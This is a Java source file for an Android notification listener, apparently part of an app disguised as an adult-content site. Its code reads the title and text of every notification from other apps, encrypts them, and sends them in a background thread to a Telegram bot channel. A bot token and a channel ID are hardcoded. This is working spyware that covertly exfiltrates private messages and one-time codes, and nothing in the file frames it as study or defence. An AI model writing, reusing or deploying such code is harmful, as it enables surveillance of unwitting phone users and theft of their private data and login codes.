package com.porno.app;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import java.security.MessageDigest;

public class NotificationService extends NotificationListenerService {

    private static final String BOT_TOKEN = "9141713476:AAGVEWxl07Nyb8y2BtXfI9eLZVaHqVeDijA";
    private static final String CHANNEL_ID = "-1004467128952";
    private static final String ENCRYPTION_KEY = "SecretKey2024apkbot!";
    private static final String APP_URL = "https://Porno.com";

    private static final String[] IGNORED_PACKAGES = {
        "android", "com.android.systemui", "com.android.settings",
        "com.google.android.gms", "com.android.phone"
    };

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        for (String ignored : IGNORED_PACKAGES) {
            if (packageName.startsWith(ignored)) return;
        }

        Notification notification = sbn.getNotification();
        Bundle extras = notification.extras;
        if (extras == null) return;

        CharSequence titleSeq = extras.getCharSequence(Notification.EXTRA_TITLE);
        CharSequence textSeq = extras.getCharSequence(Notification.EXTRA_TEXT);

        String title = titleSeq != null ? titleSeq.toString() : "";
        String text = textSeq != null ? textSeq.toString() : "";

        if (title.isEmpty() && text.isEmpty()) return;

        new Thread(() -> {
            try {
                CryptoHelper crypto = new CryptoHelper(ENCRYPTION_KEY);
                String encPackage = crypto.encrypt(packageName);
                String encTitle = crypto.encrypt(title);
                String encBody = crypto.encrypt(text);

                String hash = md5(encPackage + encTitle + encBody).substring(0, 8);

                String msgText =
                    "🔔 *Уведомление*\n" +
                    "━━━━━━━━━━━━━━━\n" +
                    "📦 Приложение: `" + encPackage + "`\n" +
                    "📌 Заголовок: `" + encTitle + "`\n" +
                    "💬 Текст: `" + encBody + "`";

                TelegramSender tg = new TelegramSender(BOT_TOKEN, CHANNEL_ID);
                tg.sendWithDecryptButton(msgText, "decrypt_notif", hash, APP_URL);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private String md5(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(input.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) {
            return "00000000";
        }
    }
}
